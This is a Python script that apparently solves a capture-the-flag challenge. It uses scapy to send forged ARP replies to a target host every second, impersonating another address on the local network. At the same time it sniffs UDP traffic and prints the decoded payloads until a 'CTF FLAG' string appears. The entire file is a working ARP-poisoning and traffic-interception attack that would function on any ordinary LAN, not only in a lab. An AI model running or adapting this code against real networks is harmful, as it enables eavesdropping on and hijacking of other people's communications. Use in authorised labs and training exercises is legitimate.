import logging
import time
import binascii
import sys
import threading

logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

from scapy.all import ARP, send, AsyncSniffer, raw

# Global flag to signal when to stop
stop_flag = threading.Event()

def process_packet(packet) -> None:
    # Check if the packet has a UDP layer
    if packet.haslayer('UDP'):
        # Extract the raw data payload from the UDP packet
        payload = raw(packet['UDP'].payload)
        
        # Convert the payload to a hex string
        hex_data = binascii.hexlify(payload).decode('utf-8')
        
        # Convert the hex string to ASCII, ignoring non-printable characters
        try:
            ascii_data = binascii.unhexlify(hex_data).decode('utf-8', 'ignore')
            print(f"Packet from {packet['IP'].src}:{packet['UDP'].sport} -> {packet['IP'].dst}:{packet['UDP'].dport}: {ascii_data}")
            
            # Check if 'CTF FLAG' is in ascii_data
            if 'CTF FLAG' in ascii_data:
                print("CTF FLAG found! Stopping...")
                stop_flag.set()  # Signal to stop the main loop
        except (binascii.Error, UnicodeDecodeError) as e:
            print(f"Error decoding packet: {e}")

def main() -> None:
    sniff = AsyncSniffer(iface='eth0', prn=process_packet, store=False)
    
    # get the MAC address of the local machine assuming it will be eth0 
    MAC = open('/sys/class/net/eth0/address').readline().strip()    
    print(f'Local MAC address: {MAC}')

    try:
        sniff.start()
        print('[>] Starting poisoning')
        while not stop_flag.is_set():
            send(ARP(op=1, pdst='192.168.3.5', psrc='192.168.3.250', hwsrc=MAC), verbose=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print('\n[>] Got keyboard interrupt')
    finally:
        if sniff.running:
            sniff.stop()  
        print('[>] Sniffer stopped')

if __name__ == '__main__':
    main()